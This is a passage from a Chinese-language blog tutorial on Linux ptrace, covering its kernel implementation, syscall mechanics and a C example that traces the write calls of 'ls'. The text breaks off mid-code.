<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>linux-沙盒入门，ptrace从0到1 | Mssn Harvey</title><meta name="keywords" content="ptrace"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言本文是在linux系统角度下，对ptrace反调试进行底层分析，使我们更清楚的看到一些底层原理的实现，更好的理解在逆向工程中的一些突破口，病毒怎么实现代码注入，本文还将列出一些常见的攻防手段，分析其原理，让我们一同见证见证茅与盾激情对决！ 什么是ptrace？如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术">
<meta property="og:type" content="article">
<meta property="og:title" content="linux-沙盒入门，ptrace从0到1">
<meta property="og:url" content="http://example.com/2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/index.html">
<meta property="og:site_name" content="Mssn Harvey">
<meta property="og:description" content="前言本文是在linux系统角度下，对ptrace反调试进行底层分析，使我们更清楚的看到一些底层原理的实现，更好的理解在逆向工程中的一些突破口，病毒怎么实现代码注入，本文还将列出一些常见的攻防手段，分析其原理，让我们一同见证见证茅与盾激情对决！ 什么是ptrace？如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3929499452.png">
<meta property="article:published_time" content="2021-03-04T13:14:20.000Z">
<meta property="article:modified_time" content="2021-03-18T05:40:30.223Z">
<meta property="article:author" content="Harvey">
<meta property="article:tag" content="ptrace">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3929499452.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-18 13:40:30'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3929499452.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">linux-沙盒入门，ptrace从0到1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-04T13:14:20.000Z" title="发表于 2021-03-04 21:14:20">2021-03-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-18T05:40:30.223Z" title="更新于 2021-03-18 13:40:30">2021-03-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是在linux系统角度下，对ptrace反调试进行底层分析，使我们更清楚的看到一些底层原理的实现，更好的理解在逆向工程中的一些突破口，病毒怎么实现代码注入，本文还将列出一些常见的攻防手段，分析其原理，让我们一同见证见证茅与盾激情对决！</p>
<h2 id="什么是ptrace？"><a href="#什么是ptrace？" class="headerlink" title="什么是ptrace？"></a>什么是ptrace？</h2><p>如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术已经很成熟了，但是ptrace仍然是一些商业软件产品中使用，也是我们入门反调试所必须的基础技术！</p>
<p>ptrace在linux 反调试技术中的地位就如同nc在安全界的地位，瑞士军刀啊!</p>
<p>ptrace使用场景：</p>
<ol>
<li>编写动态分析工具，如gdb,strace</li>
<li>反追踪，一个进程只能被一个进程追踪(<em>注：一个进程能同时追踪多个进程</em>)，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术</li>
<li>代码注入，往其他进程里注入代码。</li>
<li>不退出进程，进行在线升级。</li>
</ol>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Ptrace 可以让父进程控制子进程运行，并可以检查和改变子进程的核心image的功能（Peek and poke 在系统编程中是很知名的叫法，指的是直接读写内存内容）。ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪，strace和gdb工具就是基于ptrace编写的！</p>
<p>ptrace()其实是linux的一种系统调用，所以当我们用gdb进行attach其他进程的时候，需要root权限。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>在Linux系统中，进程状态除了我们所熟知的TASK_RUNNING，TASK_INTERRUPTIBLE，TASK_STOPPED等，还有一个TASK_TRACED，而TASK_TRACED将调试程序断点成为可能。</p>
<ol>
<li><strong>R (TASK_RUNNING)，可执行状态。</strong></li>
<li><strong>S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。</strong></li>
<li><strong>D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。</strong></li>
<li><strong>T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。</strong></li>
</ol>
<p>当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p>
<p><strong>那么什么是进程信号？</strong></p>
<p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件，信号是多种多样的，并且一个信号对应一个事件，这样才能做到当进程收到一个信号后，知道到底是一个什么事件，应该如何处理（但是要保证必须识别这个信号），个人理解信号就是操作系统跟进程沟通的一个有特殊含义的语句吧</p>
<p>我们可以直接通过kill  -l  来查看信息的种类</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/135454966.png"></p>
<p>一共62种，其中1<del>31是非可靠信号，34</del>64是可靠信号(非可靠信号是早期Unix系统中的信号，后来又添加了可靠信号方便用户自定义信号，这二者之间具体的区别在下文中会提到)</p>
<h3 id="ptrace函数的定义"><a href="#ptrace函数的定义" class="headerlink" title="ptrace函数的定义"></a>ptrace函数的定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;       </span><br><span class="line">long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</span><br></pre></td></tr></table></figure>

<p>一共有四个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- &#96;request&#96;: 表示要执行的操作类型。&#x2F;&#x2F;反调试会用到&#96;PT_DENY_ATTACH&#96;，调试会用到&#96;PTRACE_ATTACH&#96;</span><br><span class="line"></span><br><span class="line">- &#96;pid&#96;: 要操作的目标进程ID</span><br><span class="line"></span><br><span class="line">- &#96;addr&#96;: 要监控的目标内存地址</span><br><span class="line"></span><br><span class="line">- &#96;data&#96;: 保存读取出或者要写入的数据</span><br></pre></td></tr></table></figure>

<p>详情请参看man手册</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;ptrace.2.html</span><br></pre></td></tr></table></figure>

<h3 id="ptrace函数的内核实现"><a href="#ptrace函数的内核实现" class="headerlink" title="ptrace函数的内核实现"></a>ptrace函数的内核实现</h3><p>ptrace的内核实现在<code>kernel/ptrace.c</code>文件中，直接看内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data)</span><br><span class="line">&#123;</span><br><span class="line">        struct task_struct *child;</span><br><span class="line">        long ret;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_TRACEME)</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; ptrace_traceme();</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(current);</span><br><span class="line">                goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        child &#x3D; ptrace_get_task_struct(pid);</span><br><span class="line">        if (IS_ERR(child))</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; PTR_ERR(child);</span><br><span class="line">            goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_ATTACH || request &#x3D;&#x3D; PTRACE_SEIZE) &#123;</span><br><span class="line">            ret &#x3D; ptrace_attach(child, request, addr, data);</span><br><span class="line">            &#x2F;*</span><br><span class="line">             * Some architectures need to do book-keeping after</span><br><span class="line">             * a ptrace attach.</span><br><span class="line">             *&#x2F;</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(child);</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        ret &#x3D; ptrace_check_attach(child, request &#x3D;&#x3D; PTRACE_KILL ||request &#x3D;&#x3D; PTRACE_INTERRUPT);</span><br><span class="line">        if (ret &lt; 0)</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        ret &#x3D; arch_ptrace(child, request, addr, data);</span><br><span class="line">        if (ret || request !&#x3D; PTRACE_DETACH)</span><br><span class="line">            ptrace_unfreeze_traced(child);</span><br><span class="line">    </span><br><span class="line">         out_put_task_struct:</span><br><span class="line">            put_task_struct(child);</span><br><span class="line">         out:</span><br><span class="line">            return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的，其他的就是对cpu架构的相关的了。</p>
<h2 id="ptrace使用场景"><a href="#ptrace使用场景" class="headerlink" title="ptrace使用场景"></a>ptrace使用场景</h2><h3 id="1-调试："><a href="#1-调试：" class="headerlink" title="1.调试："></a>1.调试：</h3><p>因为进行一次逆向工程的时候，会对程序进行动态断点调试，来帮助我们跟进我们关注的切入点，因为要让人脑来进行推演一大长串汇编指令运行结果显然是不可能，所以我们就需要让机器来代替我们运算，我们只需要在合适的节点下断点，来观察。</p>
<p>而prtace既能用作调试，也能用作反调试，当传入的request不同时，就可以切换到不同的功能了</p>
<p><strong>原理</strong></p>
<p>当传入的request参数为PTRACE_ATTACH，就会起到调试功能</p>
<p>在使用<code>ptrace</code>之前需要在两个进程间建立追踪关系，其中trace可以不做任何事，也可使用<code>prctl</code>和<code>PTRACE_TRACEME</code>来进行设置，ptrace编程的主要部分是tracer，它可以通过附着的方式与tracee建立追踪关系，建立之后，可以控制tracee在特定的时候暂停并向tracer发送相应信号，而tracer则通过循环等待<code>waitpid</code>来处理tracee发来的信号，如下图所示:</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/494637309.png"></p>
<p><strong>建立追踪关系</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在进行追踪前需要先建立追踪关系，相关request有如下4个：</span><br><span class="line">PTRACE_TRACEME：tracee表明自己想要被追踪，这会自动与父进程建立追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。</span><br><span class="line">PTRACE_ATTACH：tracer用来附着一个进程tracee，以建立追踪关系，并向其发送SIGSTOP信号使其暂停。</span><br><span class="line">PTRACE_SEIZE：像PTRACE_ATTACH附着进程，但它不会让tracee暂停，addr参数须为0，data参数指定一位ptrace选项。</span><br><span class="line">PTRACE_DETACH：解除追踪关系，tracee将继续运行。</span><br></pre></td></tr></table></figure>

<p>其中建立关系时，tracer使用如下方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0);</span><br><span class="line">&#x2F;*或*&#x2F;</span><br><span class="line">ptrace(PTRACE_SEIZE, pid, 0, PTRACE_O_flags); &#x2F;*指定追踪选项立即生效*&#x2F;</span><br></pre></td></tr></table></figure>

<p>因为我们的栗子会用到execl（）系统调用，在此之前我有必要补充一下系统调用这个概念：</p>
<p><strong>系统调用</strong></p>
<p>为了让运行在用户态的程序能访问计算机系统的各种硬件资源，又因为硬件资源有限，而在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，所以为了更好的管理这些资源，所有对这些资源的访问都必须受操作系统控制。而程序访问这些资源，就必须通过系统调用来告诉操作系统我需要访问哪些资源。</p>
<p>在linux中，系统调用是用户态访问内核态的唯一合法方式，除异常和陷入外。</p>
<p>在linux内核中设置了一组用于实现系统功能的子程序，称为系统调用。系统调用和普通库函数调用非常相似，只是系统调用由操作系统核心提供，运行于<strong>内核态</strong>，而普通的函数调用由函数库或用户自己提供，运行于<strong>用户态</strong>。一般的，进程是不能访问内核的，它不能访问内核所占内存空间也不能调用内核函数，这是由于cpu保护机制所决定的。</p>
<p>应用程序调用内核函数基本原理：应用程序需要通过应用编程接口（api）来实现访问硬件资源功能，而api接口是通过里面封装的系统调用，去调用能实现访问硬件资源功能的相应的内核子程序，关系如下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3406173869.png"></p>
<p>一个api功能可能需要很多个系统调用来共同实现，有时候一个api功能实现，也有可能根本不需要用到系统调用，这里把api和系统调用混为一谈。</p>
<p>层层递进，来实现用户态到内核态的转换，系统调用好比一个协调者，来沟通运行在用户态的应用程序和运行在内核态的程序的交互，也就是说，内核只是和系统调用打交道；而我们程序员只需要和相应的api打交道就行，而不用去关心底层的具体系统调用怎么实现，因为api已经把一切细节都封装好了。</p>
<p>在linux下，系统调用是通过0x80实现的，Linux下有319个系统调用，我们来看看系统调用的具体细节：</p>
<p>实际上，Linux中每个系统调用都有相应的系统调用号作为唯一的标识，内核维护一张系统调用表，sys_call_table，表中的元素是系统调用函数的起始地址，而系统调用号就是系统调用在调用表的偏移量，也就是说我们通过系统调用号来调用相应的系统调用，在x86上，系统调用号是通过eax寄存器传递给内核的。比如fork（）的实现。</p>
<p>当然就算是这样，我们运行在用户态的应用程序也无法直接执行内核代码，也不能直接调用内核空间中的函数，因为内核驻留在受保护的地址空间上。所有我们需要一个机制，这个机制就是软中断，首先，用户程序为系统调用设置参数，其中一个参数是系统调用编号，参数设置完成后，程序执行“系统调用”指令，通过软中断切换到内核态执行内核代码。</p>
<p>在x86系统上的软中断由int产生。这个指令会导致一个异常：产生一个事件，这个事件会致使处理器切换到内核态并跳转到一个新的地址，并开始执行那里的异常处理程序，此时的异常处理程序实际上就是系统调用处理程序，它与硬件体系结构紧密相关，新地址的指令会保存程序的状态以便恢复到用户程序状态，计算出应该调用哪个系统调用，调用内核中实现那个系统调用的函数，恢复用户程序状态，然后将控制权返还给用户程序。</p>
<blockquote>
<p>假设用name表示系统调用的名称，那么系统调用号与系统调用响应函数的关系是：以系统调用号<code>_NR_name</code>作为下标，可找出系统调用表<code>sys_call_table</code>(见<code>arch/i386/kernel/entry.S</code>)中对应表项的内容，它正好是该系统调用的响应函数<code>sys_name</code>的入口地址。</p>
</blockquote>
<p><code>execl()</code>函数对应的系统调用为<code>__NR_execve</code>，系统调用值为59。</p>
<p>我们来仔细看看库函数execve调用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/834272689.png"></p>
<p>ptrace调试示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys&#x2F;wait.h&gt;&#x2F;*引入wait函数的头文件*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;reg.h&gt;&#x2F;* 对寄存器的常量值进行定义，如Eax，EBX....... *&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;user.h&gt;&#x2F;*gdb调试专用文件，里面有定义好的各种数据类型*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;&#x2F;*引入prtace头文件*&#x2F;</span><br><span class="line">#include&lt;unistd.h&gt;&#x2F;*引入fork函数的头文件*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;syscall.h&gt; &#x2F;* SYS_write *&#x2F;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    pid_t child;&#x2F;*定义子进程变量*&#x2F;</span><br><span class="line">    long orig_rax;&#x2F;&#x2F;定义rax寄存器的值的变量</span><br><span class="line">    int status;&#x2F;*定义进程状态变量*&#x2F;</span><br><span class="line">    int iscalling &#x3D; 0;&#x2F;*判断是否正在被调用*&#x2F;</span><br><span class="line">    struct user_regs_struct regs;&#x2F;*定义寄存器结构体数据类型*&#x2F;</span><br><span class="line">    child &#x3D; fork();&#x2F;*利用fork函数创建子进程*&#x2F;</span><br><span class="line">    if(child &#x3D;&#x3D; 0) </span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, 0, 0);&#x2F;&#x2F;发送信号给父进程表示已做好准备被跟踪（调试）</span><br><span class="line">        execl(&quot;&#x2F;bin&#x2F;ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);&#x2F;*执行命令ls -l -h,注意，这里函数参数必须要要以NULL结尾来终止参数列表*&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">            wait(&amp;status);&#x2F;&#x2F;等待子进程发来信号或者子进程退出</span><br><span class="line">            if(WIFEXITED(status))&#x2F;&#x2F;WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            orig_rax &#x3D; ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);&#x2F;&#x2F;获取rax值从而判断将要执行的系统调用号</span><br><span class="line">            if(orig_rax &#x3D;&#x3D; SYS_write)&#x2F;&#x2F;如果系统调用是write</span><br><span class="line">            &#123;    </span><br><span class="line">                ptrace(PTRACE_GETREGS, child, 0, &amp;regs);</span><br><span class="line">                if(!iscalling)</span><br><span class="line">                &#123;</span><br><span class="line">                    iscalling &#x3D; 1;</span><br><span class="line">                    printf(&quot;SYS_write call with %lld, %lld, %lld\n&quot;,regs.rdi, regs.rsi, regs.rdx);&#x2F;&#x2F;打印出系统调用write的各个参数内容</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;SYS_write call return %lld\n&quot;, regs.rax);&#x2F;&#x2F;打印出系统调用write函数结果的返回值</span><br><span class="line">                    iscalling &#x3D; 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, 0, 